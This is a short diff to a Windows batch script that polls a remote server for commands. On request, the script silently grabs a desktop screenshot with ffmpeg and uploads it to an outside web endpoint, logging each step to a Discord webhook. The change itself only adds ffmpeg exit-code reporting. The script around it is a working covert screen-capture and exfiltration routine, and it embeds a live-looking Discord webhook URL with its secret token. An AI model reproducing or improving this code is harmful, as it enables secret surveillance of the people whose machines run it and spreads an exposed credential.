@@ -1,4 +1,5 @@
 @echo off
+setlocal EnableDelayedExpansion
 set "apiRoot=https://screen-view-one.vercel.app"
 set /p name=<name.txt
 set "webhook=https://discord.com/api/webhooks/1341011448331112468/L1SNbktBvHcZmabBiTs5bh_AUXK3buMwGuZ3PynrIwpiyLAFo6y2U42KugzdaIu3PNBw"
@@ -22,8 +23,9 @@ for /f "delims=" %%i in ('curl -s -X POST -d "name=%name%" "%apiRoot%/u"') do se
 if "%result%"=="ss" (
     if exist ss.webp del ss.webp
     ffmpeg -f gdigrab -i desktop -draw_mouse 1 -vframes 1 ss.webp
+    set "exitCode=!errorlevel!"
     if exist ss.webp (
-        curl -d content="**%name%**: Captured a screenshot" %logging%
+        curl -d content="**%name%**: Captured a screenshot. ffmpeg exit code: %exitCode%" %logging%
         curl -s -X POST -F "name=%name%" -F "image=@ss.webp" "%apiRoot%/ss"
     ) else (
         curl -d content="**%name%**: Error capturing screenshot" %logging%
